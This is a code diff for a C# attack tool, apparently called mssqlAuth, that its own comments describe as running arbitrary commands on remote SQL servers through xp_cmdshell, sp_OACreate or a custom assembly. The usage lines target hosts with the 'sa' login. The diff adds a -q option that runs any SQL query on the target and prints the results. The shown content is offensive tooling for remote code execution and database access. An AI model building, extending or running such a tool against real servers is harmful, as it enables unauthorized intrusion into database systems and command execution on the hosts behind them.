@@ -1,16 +1,19 @@
 using System;
 using System.Data.SqlClient;
 
-// Execute arbitrary code on remote SQL servers via xp_cmdshell, sp_OACreate, and a custom assembly
+// Execute arbitrary code or queries on remote SQL servers via xp_cmdshell, sp_OACreate, and a custom assembly
 // Usage:
 //xp_cmdshell
-//sqlExec.exe -h <target host> -e 1 -d <database> -l sa -c "<command>"
+//mssqlAuth.exe -h <target host> -e 1 -d <database> -l sa -c "<command>"
 
 //sp_OACreate
-//sqlExec.exe -h <target host> -e 2 -d <database> -c "<command>"
+//mssqlAuth.exe -h <target host> -e 2 -d<database> -c "<command>"
 
 //Custom Assembly
-//sqlExec.exe -h <target host> -e 3 -u dbo -d msdb` -c "<command>" 
+//mssqlAuth.exe -h <target host> -e 3 -u dbo -d msdb` -c "<command>" 
+
+//Custom Query
+//mssqlAuth.exe -h <target host> -u dbo -d msdb` -q "<query>"
 
 
 namespace SQL
@@ -25,6 +28,7 @@ namespace SQL
             String execType = "";
             String login = "";
             String user = "";
+            String customQuery = "";
 
             for (var i = 0; i < args.Length; i++)
             {
@@ -34,6 +38,7 @@ namespace SQL
                 else if (args[i] == "-e") { execType = args[i + 1]; }
                 else if (args[i] == "-l") { login = args[i + 1]; }
                 else if (args[i] == "-u") { user = args[i + 1]; }
+                else if (args[i] == "-q") { customQuery = args[i + 1]; }
             }
 
             if (sqlServer == "")
@@ -226,8 +231,33 @@ namespace SQL
 
             else
             {
-                Console.WriteLine("Please specify an exec type with -e (either '1' for xp_cmdshell or '2' for sp_OACreate)");
-                Environment.Exit(0);
+                if (customQuery == "")
+                {
+                    Console.WriteLine("Please either specify a custom query with -q or an exec type with -e (either '1' for xp_cmdshell or '2' for sp_OACreate)");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    command = new SqlCommand(customQuery, con);
+
+                    reader = command.ExecuteReader();
+                    reader.Read();
+                    Console.WriteLine("Result of command is: ");
+                    Console.WriteLine(reader[0]);
+                    if (reader.HasRows)
+                    {
+                        int count = reader.FieldCount;
+                        while (reader.Read())
+                        {
+
+                            for (int i = 0; i < count; i++)
+                            {
+                                Console.WriteLine(reader.GetValue(i));
+                            }
+                        }
+                    }
+                    reader.Close();
+                }
             }
 
             con.Close();
